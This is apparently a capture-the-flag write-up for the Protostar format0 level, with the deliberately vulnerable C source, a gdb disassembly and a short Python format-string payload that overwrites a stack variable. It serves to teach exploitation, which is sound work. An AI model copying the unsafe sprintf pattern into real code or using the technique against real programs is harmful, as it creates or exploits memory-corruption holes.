#### Protostar Format0 

##### About
This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.

###### Hints
* This level should be done in less than 10 bytes of input.
* “Exploiting format string vulnerabilities”
  
This level is at /opt/protostar/bin/format0

##### Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

Notice that the input should be less than 10 bytes, we should use format string to overflow the buffer and write the target.

##### Solution
```
$ gdb format0
......
(gdb) disas vuln
Dump of assembler code for function vuln:
0x080483f4 <+0>:    push   %ebp
0x080483f5 <+1>:    mov    %esp,%ebp
0x080483f7 <+3>:    sub    $0x68,%esp
0x080483fa <+6>:    movl   $0x0,-0xc(%ebp)
0x08048401 <+13>:   mov    0x8(%ebp),%eax
0x08048404 <+16>:   mov    %eax,0x4(%esp)
0x08048408 <+20>:   lea    -0x4c(%ebp),%eax           ; buffer
0x0804840b <+23>:   mov    %eax,(%esp)
0x0804840e <+26>:   call   0x8048300 <sprintf@plt>    ; overflow
0x08048413 <+31>:   mov    -0xc(%ebp),%eax            ; variable
0x08048416 <+34>:   cmp    $0xdeadbeef,%eax           ; check value
0x0804841b <+39>:   jne    0x8048429 <vuln+53>
0x0804841d <+41>:   mov    $0x8048510,(%esp)
0x08048424 <+48>:   call   0x8048330 <puts@plt>
0x08048429 <+53>:   leave
0x0804842a <+54>:   ret
End of assembler dump.
(gdb) quit

$ python -c "print '%064d\xef\xbe\xad\xde'" | xargs ./format0
you have hit the target correctly :)
```

##### Reference
<https://thesprawl.org/research/exploit-exercises-protostar-format/#format-0>  
<http://louisrli.github.io/blog/2012/08/29/protostar-format0/>
